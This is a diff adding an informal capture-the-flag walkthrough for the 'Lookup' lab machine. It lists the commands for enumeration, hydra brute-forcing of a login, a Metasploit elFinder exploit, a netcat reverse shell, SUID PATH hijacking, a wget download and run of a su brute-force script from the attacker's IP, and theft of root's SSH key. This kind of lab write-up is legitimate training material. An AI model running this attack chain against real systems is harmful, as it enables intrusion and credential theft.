@@ -1,0 +1,65 @@
+Test your enumeration skills on this boot-to-root machine.
+
+Lookup offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. 
+By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. 
+They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.﻿
+
+Run Nmap on the target machine. Analyze that there is open ports 22/80 ssh and http. “nmap <targetmachine>” 
+Use a webserver and punch in the Target IP into the URL space. 
+Run Gobuster Tool to find any subdomains on that target " gobuster dir -u <targetmachine>:80 -w <wordlist PATH>
+the URL found with gobuster wont be able to be reached without inputting the targetmachine in /etc/hosts 
+In /etc/hosts use “nano /etc/hosts” to edit the hosts file with “ <targetmachine> <url path> ”
+Vulnerable site populates with requesting user and password. try brute forcing.
+Multiple ways to brute force use Burp:INTRUDER Hydra: hydra -L UsernameLookup.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again."
+insert credentials : jose : password123
+new URL error PATH add in /etc/hosts 
+navigate / recon through files.lookup.thm
+(this might not work but lets test it) use tool ‘ searchsploit’ on the site : ran into issues with python code
+continue to use tool ‘msfconsole’
+‘search elfinder’ to navigate to exploits
+type ‘use 4’
+fill in the (yes)  under the ‘options’
+set the RHOSTS - files.lookup.thm / LHOST - tun0
+type ‘run’ after options have been filled
+meterpreter > shell = hit enter
+we will now open another terminal and with a listening on any 1337 port using ‘nc -lnvp 1337’
+in meterpreter shell we will run a command so the listening terminal can capture the reverse shell
+connection establishes
+to use pty.spawn use this command for the interaction terminal - python3 -c 'import pty; pty.spawn("/bin/bash")'
+navigate through interactive terminal locate any anomalies 
+navigate through all directories and recognize that /sbin folders are primarly for root users.
+run the ‘find /usr/sbin -perm /4000’ 
+pwm - is a file running on high permissions
+analyze the issue with pwm 
+move over to /tmp
+execute the this command = echo ‘echo “uid=1000(think)”’ > id 
+chmod +x id
+execute ‘id’
+execute  = export PATH=/tmp:$PATH
+execute = pwm
+you will notice the passwords available 
+copy paste passwords to = vi
+now we will ‘wget’ a tool known as su-bruteforce
+on the interactive terminal - run ' wget <tun0-ip>:8000/su-bruteforce/suBF.sh
+suBF.sh downloads on to /tmp
+chmod +x suBF.sh
+./suBF.sh -u think -w password.txt
+you should then get the think password
+run = su think
+enter passwords : josemario.AKA(think)
+find the user.txt with the first flag
+now we have to see what else can we run in the root think
+run ‘sudo -l’
+put josemario.AKA password
+/usr/bin = where executable files are held. /look
+sudo look ’' /root/.ssh/id_rsa
+copy paste onto a vim 
+chmod 600 <vim-name>
+then run ' ssh -i <vim-name> root@lookup.thm
+'strings root.txt'
+
+
+
+
+
+hydra -L UsernameLookup.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again."
